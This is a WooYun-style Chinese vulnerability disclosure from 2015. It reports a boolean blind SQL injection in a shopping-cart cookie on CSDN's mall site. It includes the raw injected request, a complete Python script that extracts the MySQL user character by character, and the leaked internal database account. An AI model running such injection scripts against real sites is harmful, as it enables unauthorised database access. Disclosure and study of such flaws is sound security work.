wybug_title: CSDN另一站点MySQL盲注(附验证脚本)
wybug_detail:
漏洞详情 披露状态：   									2015-05-16：	细节已通知厂商并且等待厂商处理中									2015-05-21：	厂商已经确认，细节仅向厂商公开									2015-05-31：	细节向核心白帽子及相关领域专家公开									2015-06-10：	细节向普通白帽子公开									2015-06-20：	细节向实习白帽子公开									2015-07-05：	细节向公众公开  简要描述： CSDN另一站点MySQL盲注(附验证脚本) 详细说明：  注射点：
GET /cart/mini_cart_ajax HTTP/1.1Cookie: PHPSESSID=c6798728910c94d53a88cd8369b8def5; csdn_cart_user_id=1"%20OR%20length(user())=23--%20; cache_cart_num=0X-Requested-With: XMLHttpRequestReferer: http://mall.csdn.netHost: mall.csdn.netConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4Accept: */*
Cookie中的csdn_cart_user_id可注入。MySQL bool blind.   漏洞证明：  验证猜解user():
[Done]MySQL user is csdnmall@192.168.110.21



#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',    'Cookie': 'PHPSESSID=c6798728910c94d53a88cd8369b8def5; csdn_cart_user_id=1"%20OR%20length(user())=23--%20; cache_cart_num=0',}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')print 'start to retrive MySQL user:'user = ''for i in range(1,24):    for payload in payloads:        conn = httplib.HTTPConnection('mall.csdn.net', timeout=60)        s = "ascii(mid(lower(user()),%s,1))=%s" % (i, ord(payload))        headers['Cookie'] = 'PHPSESSID=c6798728910c94d53a88cd8369b8def5; csdn_cart_user_id=%s; cache_cart_num=0' % urllib.quote('1" OR %s-- ' % s)        conn.request(method='GET',                     url='/cart/mini_cart_ajax',                     headers = headers)        html_doc = conn.getresponse().read()        conn.close()        print '.',        if len(html_doc) > 200:            user += payload            sys.stdout.write('\r[In progress] %s' % user)            sys.stdout.flush()            breakprint '\n[Done]MySQL user is', user
   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云
